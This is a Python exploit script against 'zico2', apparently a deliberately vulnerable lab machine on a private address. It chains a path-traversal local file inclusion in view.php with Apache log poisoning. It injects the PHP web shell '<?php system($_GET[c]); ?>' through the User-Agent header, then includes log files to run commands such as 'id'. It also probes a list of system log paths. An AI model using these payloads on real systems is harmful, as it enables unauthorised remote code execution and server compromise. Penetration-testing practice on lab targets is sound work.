#!/usr/bin/env python3
"""zico2 RCE - Include SQLite file via LFI - handle encoding"""
import requests
import re
import sys

# Force UTF-8 output
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Include the SQLite file via LFI
r = s.get(f'{BASE}/view.php?page=../../usr/databases/test_users&c=id', timeout=10)
print(f'Include: {r.status_code} ({len(r.text)}B)')
print(f'Content type: {r.headers.get("Content-Type")}')

# Check for command execution
if 'uid=' in r.text:
    clean = re.sub(r'<[^>]+>', '', r.text).strip()
    print(f'[+] RCE SUCCESS!')
    print(f'Output: {clean[:300]}')
else:
    # Check what we got
    clean = re.sub(r'<[^>]+>', '', r.text).strip()
    print(f'No uid= found')
    # Check for SQLite header
    if 'SQLite' in r.text or len(r.text) > 1000:
        print('Got SQLite file content (binary)')
        # The PHP code might be embedded but not executed
        # because the SQLite header makes PHP fail to parse
        # Check for PHP errors
        errors = re.findall(r'(Parse error|Fatal error|Warning|Notice)[^<]*', r.text, re.I)
        for e in errors[:5]:
            print(f'  PHP Error: {e[:200]}')
        # Show first/last parts of response
        print(f'First 200 chars: {repr(r.text[:200])}')
        print(f'Last 200 chars: {repr(r.text[-200:])}')
    else:
        print(f'Content preview: {repr(r.text[:500])}')

# Try: the LFI includes the SQLite file but PHP can't parse it
# The trick: use a .php SQLite database that has PHP comments around the header
# OR: use the LFI to include a file that's already PHP

# Better approach: use phpLiteAdmin to create a new DB with a SPECIFIC name
# that when included via LFI, the PHP payload executes
# 
# Actually: the SQLite file format starts with "SQLite format 3\0"
# PHP will see this as text output, not execute it
# 
# THE REAL TRICK: We need to make the SQLite file be interpreted as PHP
# This only works if we can make the first bytes be "<?php"
# But SQLite header is fixed...
#
# ALTERNATIVE: Use the LFI + log poisoning
# 1. Include Apache access log via LFI  
# 2. Our User-Agent contains PHP code
# 3. When included, PHP executes our UA string

print('\n=== Log Poisoning Attempt ===')
# Set User-Agent to PHP code
r = s.get(f'{BASE}/view.php?page=../../usr/databases/test_users', 
    headers={'User-Agent': '<?php system($_GET[c]); ?>'},
    timeout=10)

# Now include the access log which should contain our UA
r2 = s.get(f'{BASE}/view.php?page=../../../var/log/apache2/access.log&c=id', timeout=10)
if 'uid=' in r2.text:
    clean = re.sub(r'<[^>]+>', '', r2.text).strip()
    print(f'[+] LOG POISONING RCE SUCCESS!')
    print(f'Output: {clean[:300]}')
else:
    print(f'Log poisoning: {r2.status_code} ({len(r2.text)}B)')
    # The access log might be empty or the path wrong
    # Check other log locations
    log_paths = [
        '../../../var/log/apache2/access.log',
        '../../../var/log/apache2/error.log', 
        '../../../var/log/access.log',
        '../../../var/log/httpd/access.log',
        '../../../tmp/access.log',
    ]
    for lp in log_paths:
        r3 = s.get(f'{BASE}/view.php?page={lp}', timeout=10)
        if len(r3.text) > 100:
            print(f'  {lp}: {len(r3.text)}B')
            # Check if our UA is in there
            if 'system(' in r3.text:
                print(f'  [+] Our payload found in log!')
